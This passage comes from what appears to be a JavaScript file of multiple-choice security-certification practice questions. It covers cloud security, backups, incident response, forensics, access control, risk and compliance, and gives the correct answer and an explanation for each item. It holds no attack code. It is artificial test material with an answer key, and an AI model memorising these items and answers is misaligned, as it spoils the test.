  { id: 'D3-Q019', domain: 3, question: 'The shared responsibility model states:', options: ['Provider handles all security', 'Customer handles all security', 'Security responsibilities are divided', 'Security is optional'], correct: 2, explanation: 'Shared responsibility divides duties: provider secures the cloud; customer secures what is in the cloud.' },
  { id: 'D3-Q020', domain: 3, question: 'CASB provides:', options: ['Physical security', 'Visibility into cloud service usage', 'Database encryption', 'Endpoint protection'], correct: 1, explanation: 'CASB (Cloud Access Security Broker) provides visibility and control over cloud services.' },
  { id: 'D3-Q021', domain: 3, question: 'CSPM detects:', options: ['Malware', 'Cloud misconfigurations', 'Phishing', 'Physical intrusions'], correct: 1, explanation: 'CSPM (Cloud Security Posture Management) identifies misconfigurations in cloud environments.' },
  { id: 'D3-Q022', domain: 3, question: 'Container security should include:', options: ['Image scanning', 'Physical locks', 'Paper backups', 'Verbal approvals'], correct: 0, explanation: 'Container security includes image scanning, runtime protection, and minimal base images.' },
  { id: 'D3-Q023', domain: 3, question: 'AES-GCM provides:', options: ['Encryption only', 'Encryption and integrity', 'Hashing only', 'Key exchange only'], correct: 1, explanation: 'AES-GCM provides both encryption and integrity (authenticated encryption).' },
  { id: 'D3-Q024', domain: 3, question: 'For passwords, use:', options: ['SHA-256 (fast hash)', 'bcrypt/Argon2 (slow hash)', 'MD5', 'No hashing'], correct: 1, explanation: 'Passwords need slow hashes (bcrypt, Argon2) to resist brute force. Fast hashes are too quick to crack.' },
  { id: 'D3-Q025', domain: 3, question: 'Digital signatures use which key to sign?', options: ['Public key', 'Private key', 'Symmetric key', 'Session key'], correct: 1, explanation: 'Sign with PRIVATE key; verify with PUBLIC key. This proves the signer owns the private key.' },
  { id: 'D3-Q026', domain: 3, question: 'Five nines availability means:', options: ['99% uptime', '99.9% uptime', '99.99% uptime', '99.999% uptime'], correct: 3, explanation: 'Five nines (99.999%) equals only 5.26 minutes of downtime per year.' },
  { id: 'D3-Q027', domain: 3, question: 'RAID 5 can survive:', options: ['No disk failures', 'One disk failure', 'Two disk failures', 'Three disk failures'], correct: 1, explanation: 'RAID 5 uses parity across disks, surviving one disk failure. RAID 6 survives two.' },
  { id: 'D3-Q028', domain: 3, question: 'Differential backup contains changes since:', options: ['Last backup of any type', 'Last FULL backup', 'Last incremental', 'Yesterday'], correct: 1, explanation: 'Differential = since last FULL. Incremental = since last backup of any type.' },
  { id: 'D3-Q029', domain: 3, question: 'The 3-2-1 backup rule means:', options: ['3 copies, 2 media types, 1 offsite', '3 days, 2 weeks, 1 month', '3 servers, 2 locations, 1 cloud', '3 admins, 2 approvals, 1 test'], correct: 0, explanation: '3-2-1: 3 copies of data, on 2 different media types, with 1 copy offsite.' },
  { id: 'D3-Q030', domain: 3, question: 'A hot site provides:', options: ['Empty space', 'Equipment in days', 'Immediate failover', 'Tape storage only'], correct: 2, explanation: 'Hot site = immediate failover. Warm = hours. Cold = days.' },
  { id: 'D3-Q031', domain: 3, question: 'RTO of 4 hours means:', options: ['Backup every 4 hours', 'Maximum 4 hours downtime', 'Maximum 4 hours data loss', '4 hour recovery window'], correct: 1, explanation: 'RTO = maximum acceptable downtime. RPO = maximum acceptable data loss.' },
  { id: 'D3-Q032', domain: 3, question: 'Data at rest should be protected by:', options: ['TLS', 'Full disk encryption/AES', 'Access controls only', 'HTTPS'], correct: 1, explanation: 'Data at rest = encryption (AES). Data in transit = TLS. Data in use = access controls.' },
  { id: 'D3-Q033', domain: 3, question: 'DLP prevents:', options: ['DDoS attacks', 'Data exfiltration', 'SQL injection', 'Physical theft'], correct: 1, explanation: 'DLP (Data Loss Prevention) monitors and prevents unauthorized data transfers.' },
  { id: 'D3-Q034', domain: 3, question: 'Crypto erasure destroys data by:', options: ['Overwriting data', 'Destroying encryption keys', 'Physical destruction', 'Degaussing'], correct: 1, explanation: 'Crypto erasure destroys the encryption keys, making encrypted data unreadable.' },
  { id: 'D3-Q035', domain: 3, question: 'Anonymization differs from pseudonymization because anonymization is:', options: ['Reversible', 'Irreversible', 'Encrypted', 'Temporary'], correct: 1, explanation: 'Anonymization is irreversible (cannot re-identify). Pseudonymization is reversible with the key.' },
  { id: 'D3-Q036', domain: 3, question: 'Degaussing works on:', options: ['All storage media', 'Magnetic media only', 'SSDs only', 'Optical media only'], correct: 1, explanation: 'Degaussing uses magnetic fields and only works on magnetic media (HDDs, tapes), not SSDs.' },
  { id: 'D3-Q037', domain: 3, question: 'Forward proxy hides:', options: ['Servers from clients', 'Clients from servers', 'Both equally', 'Neither'], correct: 1, explanation: 'Forward proxy hides clients. Reverse proxy hides servers.' },
  { id: 'D3-Q038', domain: 3, question: 'IPsec tunnel mode is used for:', options: ['Remote access only', 'Site-to-site VPN', 'Email encryption', 'File transfer'], correct: 1, explanation: 'IPsec tunnel mode encrypts entire packets, commonly used for site-to-site VPN.' },
  { id: 'D3-Q039', domain: 3, question: 'Network segmentation limits:', options: ['Internet access', 'Lateral movement', 'User productivity', 'All traffic'], correct: 1, explanation: 'Segmentation limits lateral movement - attackers cannot easily move between segments.' },
  { id: 'D3-Q040', domain: 3, question: 'SAN stands for:', options: ['Storage Area Network', 'Secure Access Node', 'System Administration Network', 'Service Application Node'], correct: 0, explanation: 'SAN (Storage Area Network) provides block-level storage access over a network.' },
  { id: 'D3-Q041', domain: 3, question: 'Jump server/bastion host provides:', options: ['Direct access to all systems', 'Controlled access point for administration', 'File storage', 'Backup services'], correct: 1, explanation: 'Jump servers provide a controlled access point for administering systems in secure zones.' },
  { id: 'D3-Q042', domain: 3, question: 'DMZ placement is:', options: ['Inside the internal network', 'Between internal and external networks', 'Outside all firewalls', 'In the cloud only'], correct: 1, explanation: 'DMZ sits between internal and external networks, hosting public-facing services.' },
  { id: 'D3-Q043', domain: 3, question: 'Load balancers improve:', options: ['Confidentiality', 'Availability', 'Integrity', 'Non-repudiation'], correct: 1, explanation: 'Load balancers distribute traffic across servers, improving availability and performance.' },
  { id: 'D3-Q044', domain: 3, question: 'Active-Active configuration means:', options: ['One system active, one standby', 'All systems actively processing', 'Systems alternate activity', 'Manual failover required'], correct: 1, explanation: 'Active-Active: all systems process traffic. Active-Passive: standby waits for failover.' },
  { id: 'D3-Q045', domain: 3, question: 'Graceful degradation means:', options: ['Complete system failure', 'Reduced functionality instead of total failure', 'Gradual performance improvement', 'Planned maintenance'], correct: 1, explanation: 'Graceful degradation maintains core functions with reduced capability during failures.' },
  { id: 'D3-Q046', domain: 3, question: 'EAP-TLS uses:', options: ['Passwords only', 'Certificates for authentication', 'No encryption', 'SMS codes'], correct: 1, explanation: 'EAP-TLS uses certificates for mutual authentication - the strongest EAP method.' },
  { id: 'D3-Q047', domain: 3, question: 'PEAP protects credentials by:', options: ['Using certificates only', 'Tunneling password in TLS', 'Not using passwords', 'Sending passwords in clear text'], correct: 1, explanation: 'PEAP (Protected EAP) creates a TLS tunnel before transmitting credentials.' },
  { id: 'D3-Q048', domain: 3, question: 'Serverless security focuses on:', options: ['Physical servers', 'Function-level permissions', 'Network cables', 'Data center access'], correct: 1, explanation: 'Serverless security focuses on function permissions, dependencies, and API protection.' },
  { id: 'D3-Q049', domain: 3, question: 'Infrastructure as Code (IaC) security includes:', options: ['Physical inspections', 'Template scanning for misconfigurations', 'Paper documentation', 'Verbal approvals'], correct: 1, explanation: 'IaC security scans templates for misconfigurations before deployment.' },
  { id: 'D3-Q050', domain: 3, question: 'Chaos engineering:', options: ['Creates random chaos', 'Deliberately tests resilience by introducing failures', 'Disables security controls', 'Randomly deletes data'], correct: 1, explanation: 'Chaos engineering deliberately introduces failures to test and improve system resilience.' },

  // Domain 4 Questions (50)
  { id: 'D4-Q001', domain: 4, question: 'SIEM provides:', options: ['Only log storage', 'Log aggregation, correlation, and alerting', 'Firewall management', 'Endpoint protection'], correct: 1, explanation: 'SIEM aggregates logs, correlates events, generates alerts, and provides reporting.' },
  { id: 'D4-Q002', domain: 4, question: 'SOAR automates:', options: ['Software development', 'Incident response workflows', 'Hardware provisioning', 'User training'], correct: 1, explanation: 'SOAR (Security Orchestration, Automation, Response) automates IR workflows and integrates tools.' },
  { id: 'D4-Q003', domain: 4, question: 'The FIRST phase of incident response is:', options: ['Detection', 'Containment', 'Preparation', 'Eradication'], correct: 2, explanation: 'IR phases: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned.' },
  { id: 'D4-Q004', domain: 4, question: 'During an active attack, the FIRST response priority is:', options: ['Identify the attacker', 'Containment', 'Full investigation', 'Notify law enforcement'], correct: 1, explanation: 'Containment stops the spread and limits damage - first priority during active attacks.' },
  { id: 'D4-Q005', domain: 4, question: 'Chain of custody ensures:', options: ['Evidence is encrypted', 'Evidence handling is documented', 'Evidence is destroyed', 'Evidence is public'], correct: 1, explanation: 'Chain of custody documents who had evidence, when, and why - critical for legal admissibility.' },
  { id: 'D4-Q006', domain: 4, question: 'Order of volatility prioritizes collecting:', options: ['Disk data first', 'Physical evidence first', 'Most volatile evidence first (RAM)', 'Logs first'], correct: 2, explanation: 'Collect most volatile first: CPU registers → RAM → Network connections → Disk.' },
  { id: 'D4-Q007', domain: 4, question: 'Write blockers are used to:', options: ['Speed up acquisition', 'Prevent modification of evidence', 'Encrypt evidence', 'Delete evidence'], correct: 1, explanation: 'Write blockers prevent any modifications to original evidence during acquisition.' },
  { id: 'D4-Q008', domain: 4, question: 'Forensic acquisition should include hashing to:', options: ['Encrypt the evidence', 'Prove evidence was not modified', 'Speed up the process', 'Compress the data'], correct: 1, explanation: 'Hashing before and after acquisition proves evidence integrity was maintained.' },
  { id: 'D4-Q009', domain: 4, question: 'Bit-for-bit imaging captures:', options: ['Only active files', 'Everything including deleted data', 'Only system files', 'Only user files'], correct: 1, explanation: 'Bit-for-bit imaging captures everything including deleted files and slack space.' },
  { id: 'D4-Q010', domain: 4, question: 'CVSS Critical score range is:', options: ['0.0-3.9', '4.0-6.9', '7.0-8.9', '9.0-10.0'], correct: 3, explanation: 'CVSS: Critical (9.0-10.0), High (7.0-8.9), Medium (4.0-6.9), Low (0.1-3.9).' },
  { id: 'D4-Q011', domain: 4, question: 'CVE provides:', options: ['Vulnerability patches', 'Unique vulnerability identifiers', 'Antivirus signatures', 'Firewall rules'], correct: 1, explanation: 'CVE (Common Vulnerabilities and Exposures) provides standardized vulnerability identifiers.' },
  { id: 'D4-Q012', domain: 4, question: 'RBAC assigns permissions based on:', options: ['Individual users', 'Job roles', 'Time of day', 'Location'], correct: 1, explanation: 'RBAC (Role-Based Access Control) assigns permissions based on job roles, scalable for enterprises.' },
  { id: 'D4-Q013', domain: 4, question: 'MAC access control uses:', options: ['Owner discretion', 'Labels and clearances', 'Job roles', 'Random assignment'], correct: 1, explanation: 'MAC (Mandatory Access Control) uses labels (classifications) - common in government/military.' },
  { id: 'D4-Q014', domain: 4, question: 'DAC allows:', options: ['System to control all access', 'Owners to grant access at their discretion', 'No user control', 'Only admin access'], correct: 1, explanation: 'DAC (Discretionary Access Control) lets owners decide who can access their resources.' },
  { id: 'D4-Q015', domain: 4, question: 'ABAC uses:', options: ['Roles only', 'Labels only', 'Multiple attributes for decisions', 'No attributes'], correct: 2, explanation: 'ABAC (Attribute-Based Access Control) uses multiple attributes (user, resource, environment) for decisions.' },
  { id: 'D4-Q016', domain: 4, question: 'PAM manages:', options: ['General user accounts', 'Privileged/admin accounts', 'Guest accounts', 'Disabled accounts'], correct: 1, explanation: 'PAM (Privileged Access Management) secures and monitors privileged/admin accounts.' },
  { id: 'D4-Q017', domain: 4, question: 'Just-in-time access provides:', options: ['Permanent elevated access', 'Temporary elevated access when needed', 'No elevated access', 'Random access'], correct: 1, explanation: 'JIT access provides temporary elevation only when needed, reducing standing privileges.' },
  { id: 'D4-Q018', domain: 4, question: 'Shared accounts should be:', options: ['Encouraged for convenience', 'Avoided due to lack of accountability', 'Required for all users', 'Used for admin access'], correct: 1, explanation: 'Shared accounts prevent accountability - you cannot determine who performed actions.' },
  { id: 'D4-Q019', domain: 4, question: 'GDPR breach notification deadline is:', options: ['24 hours', '48 hours', '72 hours', '1 week'], correct: 2, explanation: 'GDPR requires breach notification to regulators within 72 hours of discovery.' },
  { id: 'D4-Q020', domain: 4, question: 'DSAR stands for:', options: ['Data Security Access Request', 'Data Subject Access Request', 'Digital Security Audit Report', 'Database System Access Rights'], correct: 1, explanation: 'DSAR (Data Subject Access Request) is a privacy right for individuals to access their data.' },
  { id: 'D4-Q021', domain: 4, question: 'Playbooks provide:', options: ['Random response actions', 'Documented consistent response procedures', 'No guidance', 'Only technical details'], correct: 1, explanation: 'Playbooks document response procedures ensuring consistent, repeatable incident handling.' },
  { id: 'D4-Q022', domain: 4, question: 'Alert fatigue occurs when:', options: ['Analysts are well-rested', 'Too many alerts cause analysts to ignore them', 'Alerts are too quiet', 'Systems have no alerts'], correct: 1, explanation: 'Alert fatigue from too many alerts causes analysts to miss or ignore important ones.' },
  { id: 'D4-Q023', domain: 4, question: 'Baselining helps detect:', options: ['Known malware only', 'Anomalies from normal behavior', 'All attacks', 'Nothing useful'], correct: 1, explanation: 'Baselines establish normal behavior; deviations indicate potential security issues.' },
  { id: 'D4-Q024', domain: 4, question: 'Log retention requirements depend on:', options: ['Storage capacity only', 'Regulatory and business requirements', 'Random selection', 'No requirements exist'], correct: 1, explanation: 'Log retention is driven by regulations (PCI, HIPAA), legal holds, and business needs.' },
  { id: 'D4-Q025', domain: 4, question: 'Windows security logs are found in:', options: ['Task Manager', 'Event Viewer', 'Device Manager', 'Control Panel'], correct: 1, explanation: 'Windows Event Viewer contains Security, System, and Application logs.' },
  { id: 'D4-Q026', domain: 4, question: 'Syslog is used on:', options: ['Windows only', 'Linux/Unix systems', 'Mobile only', 'No systems'], correct: 1, explanation: 'Syslog is the standard logging protocol for Linux/Unix systems.' },
  { id: 'D4-Q027', domain: 4, question: 'Lessons learned occurs:', options: ['Before incidents', 'During incidents', 'After incident resolution', 'Never'], correct: 2, explanation: 'Lessons learned is the post-incident phase to improve future response.' },
  { id: 'D4-Q028', domain: 4, question: 'Eradication involves:', options: ['Detecting the threat', 'Removing the threat from systems', 'Containing the threat', 'Ignoring the threat'], correct: 1, explanation: 'Eradication removes the threat completely after containment.' },
  { id: 'D4-Q029', domain: 4, question: 'Recovery phase includes:', options: ['Detecting threats', 'Restoring systems to normal operation', 'Initial containment', 'Threat analysis only'], correct: 1, explanation: 'Recovery restores systems to normal operation after eradication.' },
  { id: 'D4-Q030', domain: 4, question: 'Threat hunting is:', options: ['Waiting for alerts', 'Proactively searching for threats', 'Ignoring potential threats', 'Only automated'], correct: 1, explanation: 'Threat hunting proactively searches for threats that evade automated detection.' },
  { id: 'D4-Q031', domain: 4, question: 'User behavior analytics (UBA) detects:', options: ['Known malware', 'Anomalous user activities', 'Network speeds', 'Hardware failures'], correct: 1, explanation: 'UBA establishes user behavior baselines and detects anomalous activities.' },
  { id: 'D4-Q032', domain: 4, question: 'Network forensics captures:', options: ['Only log files', 'Network traffic for analysis', 'Physical evidence', 'User interviews'], correct: 1, explanation: 'Network forensics captures and analyzes network traffic to investigate incidents.' },
  { id: 'D4-Q033', domain: 4, question: 'Credential stuffing uses:', options: ['Random passwords', 'Stolen username/password pairs from breaches', 'No passwords', 'Only usernames'], correct: 1, explanation: 'Credential stuffing tries stolen credentials from one breach on other sites.' },
  { id: 'D4-Q034', domain: 4, question: 'Password spraying:', options: ['Tries many passwords against one account', 'Tries few passwords against many accounts', 'Uses no passwords', 'Only works offline'], correct: 1, explanation: 'Password spraying tries common passwords against many accounts to avoid lockouts.' },
  { id: 'D4-Q035', domain: 4, question: 'Account lockout policies prevent:', options: ['All attacks', 'Brute force attacks', 'Phishing', 'Social engineering'], correct: 1, explanation: 'Account lockout limits login attempts, preventing brute force attacks.' },
  { id: 'D4-Q036', domain: 4, question: 'Federation allows:', options: ['Only local authentication', 'Cross-organizational authentication', 'No authentication', 'Anonymous access'], correct: 1, explanation: 'Federation enables authentication across organizational boundaries using trust.' },
  { id: 'D4-Q037', domain: 4, question: 'SSO provides:', options: ['Multiple logins for each system', 'Single login for multiple systems', 'No login required', 'Shared passwords'], correct: 1, explanation: 'SSO (Single Sign-On) allows one login to access multiple systems.' },
  { id: 'D4-Q038', domain: 4, question: 'SAML is used for:', options: ['Encryption', 'Federated authentication', 'File transfer', 'Database access'], correct: 1, explanation: 'SAML (Security Assertion Markup Language) enables federated authentication.' },
  { id: 'D4-Q039', domain: 4, question: 'OAuth is primarily for:', options: ['Authentication', 'Authorization', 'Encryption', 'Logging'], correct: 1, explanation: 'OAuth is an authorization framework for delegating access without sharing credentials.' },
  { id: 'D4-Q040', domain: 4, question: 'API security should include:', options: ['No authentication', 'Rate limiting and authentication', 'Open access', 'No logging'], correct: 1, explanation: 'API security includes authentication, rate limiting, input validation, and logging.' },
  { id: 'D4-Q041', domain: 4, question: 'Service accounts should:', options: ['Use shared passwords', 'Have minimal necessary permissions', 'Have admin access', 'Be undocumented'], correct: 1, explanation: 'Service accounts should follow least privilege with only necessary permissions.' },
  { id: 'D4-Q042', domain: 4, question: 'Privilege creep occurs when:', options: ['Privileges are removed', 'Excessive privileges accumulate over time', 'No privileges exist', 'Privileges are documented'], correct: 1, explanation: 'Privilege creep is accumulation of unnecessary privileges as roles change.' },
  { id: 'D4-Q043', domain: 4, question: 'Access reviews should be:', options: ['Never performed', 'Performed regularly/periodically', 'One-time only', 'Only during incidents'], correct: 1, explanation: 'Regular access reviews identify and remove unnecessary privileges.' },
  { id: 'D4-Q044', domain: 4, question: 'Deprovisioning should occur:', options: ['Never', 'When employees leave or change roles', 'Only on request', 'Annually'], correct: 1, explanation: 'Deprovisioning removes access promptly when employees leave or change roles.' },
  { id: 'D4-Q045', domain: 4, question: 'Security automation reduces:', options: ['Security', 'Response time and human error', 'Visibility', 'All controls'], correct: 1, explanation: 'Automation reduces response time and human error while improving consistency.' },
  { id: 'D4-Q046', domain: 4, question: 'Continuous monitoring provides:', options: ['Point-in-time assessment', 'Ongoing security visibility', 'No visibility', 'Annual reports only'], correct: 1, explanation: 'Continuous monitoring provides ongoing, real-time security visibility.' },
  { id: 'D4-Q047', domain: 4, question: 'Vulnerability prioritization should consider:', options: ['CVSS only', 'CVSS, exploitability, and asset value', 'Age only', 'Random selection'], correct: 1, explanation: 'Prioritize by CVSS score, exploitability, asset criticality, and business impact.' },
  { id: 'D4-Q048', domain: 4, question: 'Penetration testing authorization is called:', options: ['Scope of work', 'Rules of engagement', 'Service agreement', 'Contract'], correct: 1, explanation: 'Rules of engagement define what testers can do, targets, and boundaries.' },
  { id: 'D4-Q049', domain: 4, question: 'Black box testing means testers have:', options: ['Full system knowledge', 'No prior knowledge', 'Partial knowledge', 'Admin access'], correct: 1, explanation: 'Black box = no knowledge. White box = full knowledge. Gray box = partial knowledge.' },
  { id: 'D4-Q050', domain: 4, question: 'Tabletop exercises are:', options: ['Physical security tests', 'Discussion-based incident simulations', 'Network penetration tests', 'Automated scans'], correct: 1, explanation: 'Tabletop exercises are discussion-based simulations walking through incident scenarios.' },

  // Domain 5 Questions (50)
  { id: 'D5-Q001', domain: 5, question: 'A policy is:', options: ['Step-by-step instructions', 'High-level mandatory statement from management', 'Optional guidance', 'Technical configuration'], correct: 1, explanation: 'Policies are high-level mandatory statements establishing management intent and direction.' },
  { id: 'D5-Q002', domain: 5, question: 'Standards provide:', options: ['Optional recommendations', 'Specific mandatory requirements', 'Step-by-step procedures', 'General guidance'], correct: 1, explanation: 'Standards specify mandatory requirements that must be met to comply with policy.' },
  { id: 'D5-Q003', domain: 5, question: 'Procedures provide:', options: ['High-level direction', 'Step-by-step instructions', 'Optional recommendations', 'Policy statements'], correct: 1, explanation: 'Procedures provide step-by-step instructions for how to accomplish tasks.' },
  { id: 'D5-Q004', domain: 5, question: 'Guidelines are:', options: ['Mandatory requirements', 'Optional recommendations', 'Step-by-step instructions', 'Legal requirements'], correct: 1, explanation: 'Guidelines are optional recommendations and best practices, not mandatory.' },
  { id: 'D5-Q005', domain: 5, question: 'Risk = ', options: ['Threat only', 'Vulnerability only', 'Likelihood × Impact', 'Impact only'], correct: 2, explanation: 'Risk = Likelihood × Impact, considering threats and vulnerabilities.' },
  { id: 'D5-Q006', domain: 5, question: 'SLE (Single Loss Expectancy) equals:', options: ['ALE × ARO', 'Asset Value × Exposure Factor', 'Risk × Threat', 'Impact only'], correct: 1, explanation: 'SLE = Asset Value × Exposure Factor (percentage of asset lost in single incident).' },
  { id: 'D5-Q007', domain: 5, question: 'ALE (Annual Loss Expectancy) equals:', options: ['SLE × ARO', 'Asset Value × Risk', 'Impact × Threat', 'Vulnerability × Threat'], correct: 0, explanation: 'ALE = SLE × ARO (Annual Rate of Occurrence).' },
  { id: 'D5-Q008', domain: 5, question: 'Risk avoidance means:', options: ['Accepting the risk', 'Eliminating the activity causing risk', 'Buying insurance', 'Implementing controls'], correct: 1, explanation: 'Risk avoidance eliminates the activity or asset causing the risk.' },
  { id: 'D5-Q009', domain: 5, question: 'Risk transfer typically involves:', options: ['Accepting risk', 'Insurance or third parties', 'Implementing controls', 'Ignoring risk'], correct: 1, explanation: 'Risk transfer shifts risk to another party, typically through insurance or contracts.' },
  { id: 'D5-Q010', domain: 5, question: 'Risk mitigation involves:', options: ['Accepting risk', 'Eliminating activities', 'Implementing controls to reduce risk', 'Ignoring risk'], correct: 2, explanation: 'Risk mitigation implements controls to reduce likelihood or impact.' },
  { id: 'D5-Q011', domain: 5, question: 'Risk acceptance requires:', options: ['No documentation', 'Documented decision by appropriate authority', 'Ignoring the risk', 'Immediate remediation'], correct: 1, explanation: 'Risk acceptance must be documented and approved by appropriate authority.' },
  { id: 'D5-Q012', domain: 5, question: 'Residual risk is:', options: ['Total risk', 'Risk before controls', 'Risk remaining after controls', 'Zero risk'], correct: 2, explanation: 'Residual risk is the risk remaining after implementing controls.' },
  { id: 'D5-Q013', domain: 5, question: 'Risk appetite is:', options: ['Individual preference', 'Amount of risk organization will accept', 'Maximum possible risk', 'Zero risk tolerance'], correct: 1, explanation: 'Risk appetite is the level of risk an organization is willing to accept.' },
  { id: 'D5-Q014', domain: 5, question: 'Qualitative risk assessment uses:', options: ['Dollar values', 'High/Medium/Low ratings', 'Only numbers', 'No assessment'], correct: 1, explanation: 'Qualitative uses subjective ratings (H/M/L). Quantitative uses dollar values.' },
  { id: 'D5-Q015', domain: 5, question: 'Third-party risk management addresses:', options: ['Internal risks only', 'Vendor and partner security risks', 'Physical risks only', 'No risks'], correct: 1, explanation: 'TPRM manages security risks from vendors, partners, and suppliers.' },
  { id: 'D5-Q016', domain: 5, question: 'SOC 2 Type II differs from Type I because Type II:', options: ['Is point-in-time only', 'Evaluates controls over a period of time', 'Has no audit', 'Is less thorough'], correct: 1, explanation: 'Type II evaluates control operation over time (6-12 months). Type I is point-in-time.' },
  { id: 'D5-Q017', domain: 5, question: 'Right to audit clauses allow:', options: ['Vendors to audit customers', 'Customers to verify vendor security', 'No auditing', 'Only internal audits'], correct: 1, explanation: 'Right to audit allows customers to audit or assess vendor security practices.' },
  { id: 'D5-Q018', domain: 5, question: 'SBOM helps manage:', options: ['Physical inventory', 'Software component risks', 'Employee records', 'Financial data'], correct: 1, explanation: 'SBOM (Software Bill of Materials) tracks software components for supply chain security.' },
  { id: 'D5-Q019', domain: 5, question: 'Supply chain attacks target:', options: ['End users directly', 'Trusted vendors to reach customers', 'Physical supplies', 'Employee lunch'], correct: 1, explanation: 'Supply chain attacks compromise trusted vendors (like SolarWinds) to reach their customers.' },
  { id: 'D5-Q020', domain: 5, question: 'PCI DSS applies to:', options: ['Healthcare data', 'Payment card data', 'Government data', 'Educational records'], correct: 1, explanation: 'PCI DSS (Payment Card Industry Data Security Standard) protects payment card data.' },
  { id: 'D5-Q021', domain: 5, question: 'HIPAA protects:', options: ['Payment data', 'Healthcare information', 'Financial reports', 'Educational records'], correct: 1, explanation: 'HIPAA protects healthcare information (PHI - Protected Health Information).' },
  { id: 'D5-Q022', domain: 5, question: 'GDPR applies to:', options: ['US citizens only', 'EU personal data', 'Healthcare only', 'Financial only'], correct: 1, explanation: 'GDPR protects personal data of EU residents regardless of where processing occurs.' },
  { id: 'D5-Q023', domain: 5, question: 'NIST CSF functions are:', options: ['Plan, Do, Check, Act', 'Identify, Protect, Detect, Respond, Recover', 'CIA Triad', 'AAA'], correct: 1, explanation: 'NIST CSF: Identify, Protect, Detect, Respond, Recover.' },
  { id: 'D5-Q024', domain: 5, question: 'ISO 27001 is:', options: ['US regulation', 'International security management standard', 'Network protocol', 'Encryption standard'], correct: 1, explanation: 'ISO 27001 is an international standard for information security management systems.' },
  { id: 'D5-Q025', domain: 5, question: 'CIS Controls provide:', options: ['Legal requirements', 'Prioritized security controls', 'Network protocols', 'Encryption algorithms'], correct: 1, explanation: 'CIS Controls provide prioritized, actionable security controls for organizations.' },
  { id: 'D5-Q026', domain: 5, question: 'Internal audits are performed by:', options: ['External firms only', 'The organization itself', 'Regulators', 'Customers'], correct: 1, explanation: 'Internal audits are performed by the organization to identify gaps before external audits.' },
  { id: 'D5-Q027', domain: 5, question: 'External audits provide:', options: ['Only internal review', 'Independent third-party verification', 'No verification', 'Self-assessment'], correct: 1, explanation: 'External audits provide independent verification by qualified third parties.' },
  { id: 'D5-Q028', domain: 5, question: 'QSA stands for:', options: ['Quality Security Assessment', 'Qualified Security Assessor', 'Quantitative Security Analysis', 'Quick Security Audit'], correct: 1, explanation: 'QSA (Qualified Security Assessor) is certified to perform PCI DSS assessments.' },
  { id: 'D5-Q029', domain: 5, question: 'Security awareness training should be:', options: ['One-time only', 'Ongoing and regular', 'Optional', 'Only for IT staff'], correct: 1, explanation: 'Security awareness must be ongoing with regular updates and refreshers.' },
  { id: 'D5-Q030', domain: 5, question: 'Phishing simulations measure:', options: ['Network speed', 'User security awareness', 'System performance', 'Encryption strength'], correct: 1, explanation: 'Phishing simulations test employee awareness by sending simulated phishing emails.' },
  { id: 'D5-Q031', domain: 5, question: 'Security culture requires:', options: ['Technology only', 'Top-down support and employee buy-in', 'No management involvement', 'Punishment focus'], correct: 1, explanation: 'Security culture needs leadership support and positive employee engagement.' },
  { id: 'D5-Q032', domain: 5, question: 'Business impact analysis (BIA) identifies:', options: ['Technical vulnerabilities', 'Critical business functions and impact of disruption', 'Network traffic', 'User passwords'], correct: 1, explanation: 'BIA identifies critical functions and the impact of their disruption.' },
  { id: 'D5-Q033', domain: 5, question: 'Data classification determines:', options: ['Network topology', 'Protection requirements based on sensitivity', 'User passwords', 'System performance'], correct: 1, explanation: 'Classification determines how data should be protected based on sensitivity.' },
  { id: 'D5-Q034', domain: 5, question: 'Data owner responsibilities include:', options: ['Technical implementation only', 'Classification and protection decisions', 'Network configuration', 'No responsibilities'], correct: 1, explanation: 'Data owners are accountable for classification and protection decisions.' },
  { id: 'D5-Q035', domain: 5, question: 'Data custodian responsibilities include:', options: ['Classification decisions', 'Technical implementation of controls', 'Policy creation', 'Business decisions'], correct: 1, explanation: 'Data custodians implement technical controls as directed by data owners.' },
  { id: 'D5-Q036', domain: 5, question: 'Privacy officer responsibilities include:', options: ['Network security only', 'Ensuring privacy compliance', 'Physical security', 'Software development'], correct: 1, explanation: 'Privacy officers ensure compliance with privacy regulations and policies.' },
  { id: 'D5-Q037', domain: 5, question: 'Security metrics should be:', options: ['Impossible to measure', 'Actionable and meaningful', 'Hidden from management', 'Static'], correct: 1, explanation: 'Metrics should be meaningful, actionable, and drive improvement.' },
  { id: 'D5-Q038', domain: 5, question: 'KPI stands for:', options: ['Key Privacy Indicator', 'Key Performance Indicator', 'Known Problem Issue', 'Key Protocol Interface'], correct: 1, explanation: 'KPI (Key Performance Indicator) measures performance against objectives.' },
  { id: 'D5-Q039', domain: 5, question: 'KRI stands for:', options: ['Key Risk Indicator', 'Key Recovery Index', 'Known Risk Issue', 'Key Response Initiative'], correct: 0, explanation: 'KRI (Key Risk Indicator) provides early warning of increasing risk.' },
  { id: 'D5-Q040', domain: 5, question: 'Data retention policies define:', options: ['Network bandwidth', 'How long data is kept', 'User passwords', 'System performance'], correct: 1, explanation: 'Retention policies define how long data is kept and when it is destroyed.' },
  { id: 'D5-Q041', domain: 5, question: 'Legal hold requires:', options: ['Destroying evidence', 'Preserving data for litigation', 'Deleting all data', 'No action'], correct: 1, explanation: 'Legal hold preserves data that may be relevant to litigation or investigation.' },
  { id: 'D5-Q042', domain: 5, question: 'Due diligence is:', options: ['Ignoring risks', 'Reasonable investigation before decisions', 'No investigation', 'Random selection'], correct: 1, explanation: 'Due diligence is reasonable investigation to understand risks before decisions.' },
  { id: 'D5-Q043', domain: 5, question: 'Due care is:', options: ['Ignoring responsibilities', 'Acting responsibly to protect assets', 'No action required', 'Random actions'], correct: 1, explanation: 'Due care is acting responsibly to protect assets and meet obligations.' },
  { id: 'D5-Q044', domain: 5, question: 'Acceptable Use Policy defines:', options: ['Network topology', 'Appropriate use of organizational resources', 'Encryption algorithms', 'Physical security'], correct: 1, explanation: 'AUP defines what users can and cannot do with organizational resources.' },
  { id: 'D5-Q045', domain: 5, question: 'Change management reduces:', options: ['All changes', 'Unauthorized and uncontrolled changes', 'All security', 'All documentation'], correct: 1, explanation: 'Change management ensures changes are authorized, tested, and documented.' },
  { id: 'D5-Q046', domain: 5, question: 'Separation of duties prevents:', options: ['All fraud', 'Single person controlling entire critical process', 'All changes', 'All access'], correct: 1, explanation: 'Separation of duties requires multiple people for critical processes, preventing fraud.' },
  { id: 'D5-Q047', domain: 5, question: 'Job rotation helps detect:', options: ['Network issues', 'Fraud through fresh perspective', 'Hardware failures', 'Software bugs'], correct: 1, explanation: 'Job rotation brings fresh eyes that may detect fraud or errors.' },
